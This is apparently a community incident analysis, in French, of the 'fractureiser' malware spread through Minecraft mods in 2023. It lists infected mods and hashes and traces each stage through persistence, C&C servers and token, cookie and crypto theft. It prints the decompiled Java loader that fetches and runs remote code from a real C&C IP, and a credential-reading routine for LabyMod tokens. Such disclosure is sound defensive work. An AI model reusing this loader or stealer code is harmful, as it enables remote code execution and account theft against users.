# Informations techniques

## Distribution

Certains modpacks ont recu des mises a jours sans que l'auteur ne soit au courant, ajoutant une dépendence sur des mods malveillants. Ces mises a jours ont été archivés imédiatement après l'upload, ce qui signifie *qu'ils n'aparaissent pas sur l'interface Web, seulement sur L'API.*

Les Mods malveillants ont été upload il y a plusieures semaines. La plupart ont été uploadé
par un seul compte en utilisant des noms clairement autogénérés, ils sont surement le point de départ de l'infection.
Luna Pixel Studio a été compromis en raison d'un dévelopeur testant un de ces mods, comme c'etait un umpload 
interessant.

### Mods et plugins affectés recensés.

Note: Cette liste est non exaustive. Elle a été construite durant les premiers jours de l'investigation et nous avons 
vite réalisé que la taille de l'infection etait plus grande que ce que nous pensions, rendant la traque individuelle 
inutille. Cette list reste ici pour des raisons historiques.

Voir aussi la 
[liste](https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/)
des projets affectés publié par Curseforge.

|mod/plugin|lien(s)|SHA1|"Uploader"|
|---|---|---|---|
|Skyblock Core|[www.curseforge.com/minecraft/mc-mods/skyblock-core/files/4570565](https://www.curseforge.com/minecraft/mc-mods/skyblock-core/files/4570565) |`33677CA0E4C565B1F34BAA74A79C09A3B690BF41`|Luna Pixel Studios|
|Dungeonz|[legacy.curseforge.com/minecraft/mc-mods/dungeonx/files/4551100 (removed)](https://legacy.curseforge.com/minecraft/mc-mods/dungeonx/files/4551100) |`2DB855A7F40C015F8C9CA7CBAB69E1F1AAFA210B`|fractureiser|
|Haven Elytra|[dev.bukkit.org/projects/havenelytra/files/4551105 (removed)](https://dev.bukkit.org/projects/havenelytra/files/4551105)   [legacy.curseforge.com/minecraft/bukkit-plugins/havenelytra/files/4551105 (removed)](https://legacy.curseforge.com/minecraft/bukkit-plugins/havenelytra/files/4551105) |`284A4449E58868036B2BAFDFB5A210FD0480EF4A`|fractureiser|
|Vault Integrations|[www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590 (removed)](https://www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590)|`0C6576BDC6D1B92D581C18F3A150905AD97FA080`|simpleharvesting82|
|AutoBroadcast|[www.curseforge.com/minecraft/mc-mods/autobroadcast/files/4567257 (removed)](https://www.curseforge.com/minecraft/mc-mods/autobroadcast/files/4567257)|`C55C3E9D6A4355F36B0710AB189D5131A290DF26`|shyandlostboy81|
|Museum Curator Advanced|[www.curseforge.com/minecraft/mc-mods/museum-curator-advanced/files/4553353 (removed)](https://www.curseforge.com/minecraft/mc-mods/museum-curator-advanced/files/4553353)|`32536577D5BB074ABD493AD98DC12CCC86F30172`|racefd16|
|Vault Integrations Bug fix|[www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590 (removed)](https://www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590)|`0C6576BDC6D1B92D581C18F3A150905AD97FA080`|simplyharvesting82
|Floating Damage|[dev.bukkit.org/projects/floating-damage (removed)](https://dev.bukkit.org/projects/floating-damage)|`1d1aaccdc13244e980c0c024610ecc77ea2674a33a52129edf1bb4ce3b2cc2fc`|mamavergas3001
|Display Entity Editor|[www.curseforge.com/minecraft/bukkit-plugins/display-entity-editor/files/4570122 (removed)](https://www.curseforge.com/minecraft/bukkit-plugins/display-entity-editor/files/4570122)|`A4B6385D1140C111549D95EAB25CB51922EEFBA2`|santa_faust_2120

Darkhax a envoyé ceci: https://gist.github.com/Darkhax/d7f6d1b5bfb51c3c74d3bd1609cab51f

potentiellement plus: Sophisticated Core, Dramatic Doors, Moonlight lib, Union lib

## Étape 0 (jar infectés)

Les mods ou plugins affectés ont une nouvelle méthode `static void` inséré dans leur classe principale, ainsi qu'un appel vers cette méthode inséré dans l'initialiseur de la class. Pour DungeonZ, la méthode s'appelle `_d1385bd3c36f464882460aa4f0484c53` et se trouve dans `net.dungeonz.Dungeonmain`. Pour skyblock Core, la méthode s'appelle `_f7dba6a3a72049a78a308a774a847180` et se trouve dans `com.bmc.coremod.BMCSkyblockcore`. Pour HavenElytra, le code est inséré directement dans l'initialiseur de `valorless.havenelytra.HavenElytra`.

Le code est obfusqué, utilisant `new string(new byte[]{...})` au lieu de str litéraux.

Dans l'échantillon de D3SL "Create Infernal Expansion Plus", une version plagiant "Create Infernat Expansion Compat" avec un malware inséré dans la classe principale:
```java
static void _1685f49242dd46ef9c553d8af1a4e0bb() {
  Class.forName(new String(new byte[] {
      // "Utility"
    85, 116, 105, 108, 105, 116, 121
  }), true, (ClassLoader) Class.forName(new String(new byte[] {
      // "java.net.URLClassLoader"
    106, 97, 118, 97, 46, 110, 101, 116, 46, 85, 82, 76, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114
  })).getConstructor(URL[].class).newInstance(new URL[] {
    new URL(new String(new byte[] {
        // "http"
      104, 116, 116, 112
    }), new String(new byte[] {
        // "85.217.144.130"
      56, 53, 46, 50, 49, 55, 46, 49, 52, 52, 46, 49, 51, 48
    }), 8080, new String(new byte[] {
        // "/dl"
        47, 100, 108
        }))
  })).getMethod(new String(new byte[] {
      // "run"
    114, 117, 110
  }), String.class).invoke((Object) null, "-114.-18.38.108.-100");
}
```

Ce code:
1. Crée un `URLClassLoader` avec l'url `http://[85.217.144.130:8080]/dl` ([shodan](https://www.shodan.io/host/85.217.144.130))
2. Charge une classe `Utility` depuis le loader, prenant du code d'internet.
3. Appelle la méthode `run` dans la classe `Utility`, donnant en paramètre un str différent pour chaque mod infecté (!). E.g.
    * Skyblock Core: "`-74.-10.78.-106.12`"
    * Dungeonz: "`-114.-18.38.108.-100`"
    * HavenElytra: "`-114.-18.38.108.-100`"
    * Vault Integrations: "`-114.-18.38.108.-100`"

Les numerals sont ecrit dans un fichier nommé ".ref" sous forme de bits. Cela ressemble a un moyen pour l'auteur de suivre l'infection.

La création du classloader est hardcodé dans cet URL et n'utilise pas l'URL Cloudflare comme le fichier de l'Étape 1. Comme cette IP est dorénavant hors ligne, cela signifie que les charges utilies des fichier Étape 0 *desquels nous sommes au courant* ne fonctionnenet plus.

## Étape 1 (`dl.jar`)

SHA-1: `dc43c4685c3f47808ac207d1667cc1eb915b2d82`

[une version décompilée est disponible ici](../../../decomp/).

La première chose qu'`Utility.run` fait est de vérifier si la propriété système `neko.run` est active. Si tel est le cas, *Le fichier aretera son execution*. Si tel n'est pas le cas, un str vide est initialisé et le code continue de s'executer. Cela fait penser que le malware évite de s'executer lui même plusieurs fois, dans le cas ou il aurait infecté plusieurs mods. *Cela ne peut pas etre considéré comme un killswitch car Étape1 est téléchargé depuis l'internet et peut changer.*

`Utility.run` tente de contacter `85.217.144.130`, ainsi qu'un domaine CLoudflares (`https://files-8ie.pages.dev/ip`). Des raports d'abus ont déja été envoyés. Le domaine est utilisé pour récupérer L'IP du serveur C&C si la première IP ne répond plus - L'URL répond avec une représentation binaire d'une adresse IPV4.

*L'IP C&C a été nullrouted après qu'un raport ai été envoyé a l'hébergeur. Nous allons garder un oeil sur la page Cloudflare pour voir si un nouveau serveur C&C est mis en place, nous ne pouvons pas imaginer qu'ils n'avait pas prévus ce genre de scénario.* Merci Serversion pour tes réponses rapides.

*Le domaine CLoudflares a été supprimé*. Il y a un nouveau serveur C&C (`107.189.3.101`).

Étape 1 essaye ensuite de devenir persistent en effectuant les étapes suivantes:
1. Télécharge Étape 2 (lib.jar pour Linux, libWebGL64.jar pour Windows) depuis le serveur
2. Programe Étape 2 pour s'executer automatiquement au démarage de la machine:
* Sous Linux, le fichier essaye de placer des fichiers dans `/etc/systemd/system` ou `~/.config/systemd/user`
        * Le fichier placé dans le fichier utilisateur ne fonctionne jamais, car il essaye d'utiliser `multi-user.target`, qui n'existe pas pour les unités utilisateurs.
* Sous Windows, le fichier tente de modifier le registre
    (`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`) pour s'executer lui même, ou
    en cas d'échec, essaye de s'ajouter au dossier `Windows\Start Menu\Programs\Startup`.

## Étape 2 (`lib.jar` ou `libWebGL64.jar`)

Hash sha1 connus:
* `52d08736543a240b0cbbbf2da03691ae525bb119`
* `6ec85c8112c25abe4a71998eb32480d266408863` ( l'upload précédent de D3SL)

Étape2 est obfusqué avec une version démo de l'obfuscateur Allatori, et sa classe principalle est appelé `Bootstrap`.
Il [le fichier] contient une autre classe appelé, nommée `h` qui semble être une simple classe de communiquation, mais est vide 
sinon. Vous pouvez 
[voir un essai de reproduire le code source](https://gist.github.com/SilverAndro/a992f85bec29bb248c354ccf5d2206fe).

Quand executé, le fichier effectue les étapes suivantes:
1. Ouvre le port `9655` et ajoute un hook de shutdown pour se fermer quand la jvm (java virtual machine) se ferme.
2. S'autolocalise sur le disque et travaille au plus près.
3. Si `.ref` existe, il lit les clés identifiant du fichier.
4. Lance une boucle pour:
    1. vérifier avec `https://[files-8ie.pages.dev]:8083/ip` pour le serveur et tente de s'y connecter.
    2. Recoit un flag pour savoir si l'update check doit se continuer, si non, report au serveur depuis le port `1338`
    3. Si tel est le cas, recoit un hash et le vérifie auprès de `client.jar`, renvoyant un bit si il veut une update
    4. Si tel est le cas, recoit et crée/réécrit `client.jar`, cachant ses atributs.
    5. charge et invoque la méthode statique `dev.neko.nekoclient.CLient#start(InetAdress, refFiileBytes)`
    6. Attend 5 secondes

## Étape 3 (`client.jar`)

sha-1: `c2d0c87a1fe99e3c44a52c48d8bcf65a67b3e9a5`
sha-1: `e299bf5a025f5c3fff45d017c3c2f467fa599915`

`client.jar` est un sac de code incroyablement complexe et obfusqué et contien du java et du code natif.

Il contien une charge utile native `hook.dll`, décompilée: https://gist.githubusercontent.com/NotNite/79ab1e5501e1ef109e8030059356b1b8/raw/c2102bf5ff74275ac44c2200d5121bfff652fd49/hook.dll.c

Il y a 2 fonctions natives faites pour être appelés depuis Java:
* `__int64 __fastcall Java_dev_neko_nekoclient_api_windows_WindowsHook_retrieveClipboardFiles(__int64 a1);`
* `__int64 __fastcall Java_dev_neko_nekoclient_api_windows_WindowsHook_retrieveMSACredentials(__int64 a1);`

Après analyse, ces 2 fonctions fonctionnent comme indiqué dans leur nom:
* Lis le contenu du presse papier
* Vole les tokens du compte Microsoft

Il y a aussi des preuves de code essayant de réaliser les choses suivantes:
* Scan pour *tout* les fichiers jar sur le système qui ressemble a un mod Minecraft (en détéctant Forge/Fabric/Quilt/Bukkit), 
  ou [déclare une classe principale](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L235-L244)
  (la plupart des programmes java)
  et essaye de s'injecter dans chaqu'un d'entre eux.
* Vole les cookies de navigation ainsi que les informations de connexion de plusieurs navigateurs Web
* Remplace les adresses de cryptomonnaies dans le presse papier avec d'autres, présumées apartenant a l'attaquant
* Vole les tokens discord
* Vole les tokens de Minecraft et Microsoft d'un grand nombre de launches
* Vole des crypto wallets

Les fichiers jar sont détéctés comme des mods Mincraft comme suit:
* Forge (`dev/neko/e/e/e/A`): Le malware tente de localiser l'anotation `@Mod`, qui est requise dans chaque mod
* Bukkit (`dev/neko/e/e/e/C`): Le malware vérifie si une classe Bukkit `JavaPlugin` existe
* Fabric/Quilt (`dev/neko/e/e/e/i`): Le malware vérifie si une classe implémente `ModInitializer`
* Bungee (`dev/neko/e/e/e/l`): Le malware vérifie si une classe Bungee `Plugin` existe
* Vanilla (`dev/neko/e/e/e/c`): Le malware vérifie si la classe principale `net.minecraft.client.main.Main` existe

## Étape3 (`unobf-client.jar`)

Aux alentours de 14:20 UTC le 07/06/2023, client.jar a accidentellement été remplacé par une versionnon obfusquée. Vous pouvez trouver l'archive ici: https://github.com/clrxbl/NekoClient

Cela valide les comportements/preuves suspicieux(.se) obtenues lors de l'annalyse de l'échantillon obfusqué.

### Réplication

la réplication est gérée par un processus automatique dans les fichiers jar a travers l'entièretée des filesystem sur la machine locale. Nimporte quel fichier jar qui contien des classes rencontrant certains critères est sujet a une infection. Le procesus de scan et d'injection de code malicieux peut etre trouvé ici: [`dev/neko/nekoclient/Client.start(InetSocketAddress, byte[])`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L273)

Les critères vérifiés par le processus se trouvent ici: [`dev/neko/nekoinjector/template/impl`](https://github.com/clrxbl/NekoClient/tree/main/dev/neko/nekoinjector/template/impl)

* `BungeecordPluginTemplate` regarde pour l'interface `net/md_5/bungee/api/plugin/Plugin`
* `FabricModTemplate` regarde pour l'interface `net/fabricmc/api/ModInitializer`
* `ForgeModTemplate` regarde pour l'annotation `net/minecraftforge/fml/common/Mod`
* `MinecraftClientTemplate` regarde pour l'existance de `net/minecraft/client/main/Main.class` et de `net/minecraft/client/gui/GuiMultiplayer.class` dans le jar
* `SpigotPluginTemplate` regarde pour le super-type `org/bukkit/plugin/java/JavaPlugin`
* Si aucun des critères ci-dessus ne sont remplis, [il vas tenter d'infecter la classe principale du fichier jar](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L235-L244) - si il existe.

Le code malicieux injecté est une backdoor vue dans Étape0. Le moyen dont le code fonctionne est qu'il est déclaré dans la classe `Loader` dans une méthode statique. La classe `Injector` qui est adjacente est responsable de l'extraction du code depuis le `Loader` et de l'insertion dans d'autres classes visées par l'infection. La valeur retournée par `Injector.loadInstallerNode(...)` est `MethodNone`. Maintenant les class n'ont qu'a ajouter la méthode a la classe visée. Dans [`dev/neko/nekoclient/Client.start(InetSocketAddress, byte[])`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L272), `Entry.inject(MethodNode)` est appelé pour ariver a ce résultat. Pour s'assurer que la méthode malicieuse est invoquée, cette méthode ajoute de la logique a l'initialisateur de la classe visée. En partant du principe que l'initialisateur est lancé quand la classe se charge pour la première fois, et que la classe visée est un plugin/mod, le code sera toujours triggered par des utilisateurs qui lancent un modpack infecté ou un serveur. Après quoi, le jar est repacked avec la nouvelle classe fraichement infectée.

### Méthodes anti Sandbox

Quelque chose peut commun dans les Malware JVM, qui est présent ici est la classe intitulée `VMEscape`. Cela recherche si le fichier se trouve dans un [bac a sable Windows](https://learn.microsoft.com/en-us/windows/security/application-security/application-isolation/windows-sandbox/windows-sandbox-overview) en vérifiant si l'utilisateur actuel est `WDAGUtilityAccount`. Si cette condition est remplie, un essait pour s'échaper de la VM est réalisé.

Le processus est a peut près comme suit:

- Lance un thread répétitif pour run les actions suivantes:
  - Crée un directory temporaire en utilisant `Files.createTempDirectory(...)`
  - Itère par dessus les entrées `FileDescriptor` dans le presse papier système qui représente le presse papier host
  - Crée un racourcit qui ressemble au fichier original _(en utilisant des icones SHELL32)_ qui invoque le malware
  - Assigne ce racourcit au presse papier, réécrivant les references du fichier originel

DE ce fait, si un utilisateur copie un fichier et vas pour le coller ailleur, l'utilisateur vas coller un racourcit ressemblant a leur fichier, qui fait tourner le malware.

### Vol de données

**Tokens MS (microsoft)**: Puisque ce malware vise les mods Minecraft, il est naturel pour lui d'essayer de voler les tokens de connexion aux comptes MS utilisés pour se connecter a Minecraft. Cerrtains launchers gardent cette donée en sécuritée dans un fichier local, dans lequel le malware vas tenter d'y lire son contenu. Cela affecte une variétée de launchers tel que :

* Le launcher Vanilla/Mojang
* Le launcher legacy Vanilla/Mojang
* PolyMC / Prism
* Technic
* Feather
* LabyMOd (< v3.9.59)
* Et tout les tokens trouvable dans le [Windows Credential Manager](https://support.microsoft.com/en-us/windows/accessing-credential-manager-1b5c916a-6a16-889f-8581-fc16e8165ac0)

La logique de retrait (vue dans [`dev/neko/nekoclient/api/stealer/msa/impl/MSAStealer.java`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/api/stealer/msa/impl/MSAStealer.java)) est similaire a celle ci car les donés sont stoqués d'une manière similaire. Par exemple voicit le code pour laby-mod:
```java
private static void retrieveRefreshTokensFromLabyMod(List<RefreshToken> refreshTokens) throws IOException {
	String appdata = System.getenv("APPDATA");
	if (Platform.isWindows() || Objects.isNull(appdata)) {
		Path path = appdata == null ? null : Paths.get(appdata, ".minecraft", "LabyMod", "accounts.json");
		if (Files.isReadable(path)) {
			extractRefreshTokensFromLabyModLauncher(refreshTokens, Json.parse(Files.readString(path)).asObject());
		}
	}
}
```
le code pour récupérer les tokens depuis Feather/PolyMC/Prism est essentiellement identique.

La différence dans la stratégie pour le launcher vanilla est que le fichier Json a une couche additionelle de cryptographie la protégeant.

La différence dans la stratégie pour technic est que technic stoque les tokens en utilisant un objet java buit-in, entourant `com.google.api.client.auth.oauth2.StoredCredential`.

**Tokens Discord**: Tout le monde a vus un voler de token avant. Ca vole le token et d'autres informations tel que les méthodes de payement, numéro de telephone lié, etc. Afecte les clients standart,canary,ptb et lightcord. Source: [`dev/neko/nekoclient/api/stealer/discord/DiscordAccount.java`](https://github.com/clrxbl/NekoClient/blob/fd76c5f9d40d1e10de11f00a6b4e0cca3d6221a3/dev/neko/nekoclient/api/stealer/discord/DiscordAccount.java)

**Cooies & informations sauvegardées**: Vole les cookies et les informations de connection sauvegardés dans les navigateurs web afectés. Source : [`dev/neko/nekoclient/api/stealer/browser/impl/BrowserDataStealer.java`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/api/stealer/browser/impl/BrowserDataStealer.java)

- Mozilla Firefox
    - Waterfox
    - Pale Moon
    - SeaMonkey
- Chrome
    - Edge
    - Brave
    - Vivaldi
    - Yandex
    - Slimjet
    - CentBrowser
    - Comodo
    - Iridium
    - UCBrowser
    - Opera
      - Beta
      - Developer
      - Stable
      - GX
      - Crypto
    - CryptoTab

## Étape 3b (`dummyloader3.jar`)

Étape 3 a été remplacé par un autre fichier jar peut après l'aret du second serveur C&C.

Il semble que ça ne soit que Skyrage, qui est un autre malware Minecraft, visant blackspigot.

### Persistence
- Windows: task scheduler `MicrosoftEdgeUpdateTaskMachineVM`, le fichier `%AppData%\..\LocalLow\Microsoft\Internet Explorer\DOMStore\microsoft-vm-core`
- Linux: `/bin/vmd-gnu`, `/etc/systemd/system/vmd-gnu.service`, service `vmd-gnu`

## Connexions
- Serveur C&C: `connect.skyrage.de`
- Téléchargement: `hxxp://t23e7v6uz8idz87ehugwq.skyrage.de/qqqqqqqqq`

### Actions
- `qqqqqqqqq` jar extrait tout plein d'informations (cookies de navigation, discord, minecraft, epic games, steam, gestionaires de mdp, etc.)
- remplace les adresses crypto dans le presse papier avec une adresse reçue depuis `95.214.27.172:18734`
- Persistence: voir ci dessus
- Contien des auto updateurs, version actuelle 932 (`hxxp://t23e7v6uz8idz87ehugwq.skyrage.de/version`)

### Mapping

Ce qui suit sont les mappings pour ces échantillon, pouvant etre apliqué via Enigma ou tout autre outil suportant un mapping Enigma.
```
CLASS D Chat
CLASS E ChatChain
CLASS E$a ChatChain$ChainLink
CLASS F ClientChat
CLASS G EncryptionRequest
CLASS H EncryptionResponse
CLASS H$a EncryptionResponse$EncryptionData
CLASS J KeepAlive
CLASS L LoginPayloadResponse
CLASS O PluginMessage
CLASS O$1 BungeeCordProtocolVersionMapFunction
CLASS P SetCompression
CLASS R StatusResponse
CLASS T CryptocurrencyClipboardLogger
CLASS T$1 CryptocurrencyClipboardLogger$LowLevelKeyboardHook
CLASS U AutoRunPersistence
CLASS V InputStreamFileWriter
CLASS W OperatingSystem
CLASS X AutoUpdater
CLASS Y StacktraceSerializer
CLASS a MalwareClientConnectionHandler
CLASS b Main
    FIELD a intconst I
    FIELD a string0 Ljava/lang/String;
    FIELD a ipAddress Ljava/net/InetSocketAddress;
CLASS g MinecraftBot
CLASS h MinecraftBot2
CLASS o MinecraftFriendlyByteBuf
CLASS s MinecraftIPAddressResolver
CLASS t MinecraftPacketDecoder
CLASS y MinecraftPacketEncryption
```

### Anti-décompilation

Ces échantillon a l'air d'abuser de technicalités dans le fichier-class pour faire crashed les outils de décompilation!. de tels exploits peuvent etre réparés en utilisant [CAFED00D](https://github.com/Col-E/CAFED00D), un parser qui filtre les atributs malformés. Après quoi, le seul obstacle restant est l'obfuscation basique apliquée par Allatori démo.

# Autres informations

Plus de détails sont disponibles dans le document de reveal d'Étape3: https://hackmd.io/5gqXVri5S4ewZcGaCbsJdQ

Quand le 2nd serveur C&C eu été suprimé, une version déobfusquée d'Étape3 a accidentellement été rendue publique 
pendant environ 40 minutes.

Le serveur primaire ~~est~~ *a été* (terminé) hébergé chez Servion, une compagnie basé aux pays-bas.

Le nouveau serveur C&C a été lui aussi été terminé. _2023-06-07 18:51 UTC_

Autre qu'un serveur HTTP sur le port 80/443 et un serveur SSH sur le port 22, les ports suivant etaient ouvert sur `85.217.144.130` et `107.189.3.101`:

* 1337
* 1338 (un port référencé dans le fichier Étape1 pour créer une nouvelle connexion de débogage)
* 8081 (C'est un serveur Websocket - pas de fonctions aparentes a ce jour, non référencé dans quelque code malicieux)
* 8082 (personne n'a rien pu en tirer, non référencé dans quelque code malicieux)
* 8083 (contacté par Étape1)

Curieusement, la page bukkit de fractureiser (l'utilisateur malveillant) indique "Last active Sat, Jan, 1 2000 00:00:00" https://dev.bukkit.org/members/fractureiser/projects/

## échantillons

S'il vous plait, demandez dans le chat IRC pour une permission d'accès lecture/ecriture aux échantillons. Le code source d'Étape 3, décompilé est disponible ici: https://github.com/clrxbl/NekoClient

## follow-ups
Pendant qu'il est un peut tôt pour parler de follow-ups de long terme, tout ceci a amené plusieurs problèmes critiques dans l'écosystème de minecraft modé. Cette section n'est qu'un brainstorming sur celles ci et comment nous pourrions nous améliorer.

#### 1. Review au niveau des repo de mods

Que fait exactement Curseforge et Modrinth quand ils "reviewent" un mod? Nous nous devont de savoir, au lieu de se reposer sur la 
sécuritée par l'obscuritée.

#### 2. Un manquement de signature de code

Contrairement a l'industrie software, les mods déposés sur des repo sont généralement non signés avec une clé de signature prouvant que le propriétaire de la clé a déposé le code. Le fait d'avoir une signature et une distribution de clé séparé mitige Curseforge.

Cependant, cela nous ammène donc a un problème plus large, le fait que "ce jar a cette signature" a besoin d'etre communiqué en dehors de Curseforge et Modrinth, pour permettre aux loaders ou aux utilisateurs de vérifier leur signature.
Forge a essayé d'introduire les signatures quelques années auparavant, et il y avait des limites.

#### 3. Un manque de compilation reproduisibles

les toolchains de Minecraft sont cahotiques, et les builds ne sont généralement pas reproduisibles. Il est courant d'avoir des scripts de construction qui téléchargent des versions -SNAPSHOT non épinglées de plugins Gradle aléatoires et les utilisent, ce qui entraîne des artefacts non reproductibles et donc non auditables.

Un plugin Gradle aléatoire étant un futur vecteur d'attaque n'est pas hors de la question.

#### 4. Manque de sanboxing de minecraft

Le modding Minecraft Java editona toujours eu le plein pouvoir de Java, et c'est l'autre coté de cette lame a double tranchant: du code malicieux a un impacte tout aussi dément.
Minecraft en lui même n'est pas lancé avec quelque sandboxing que ce soit, et les serveurs ne le sont généralement pas non plus, a part si le propriétaire s'y connait assez pour se le permettre.

Un bon sandboxing est compliqué, spéciallement sur des systèmes tels que Linux ou SELinux/Apparmor sont connu pour avoir une UX si terrible que personne ne tente de les déployer.
>>>>>>> Stashed changes
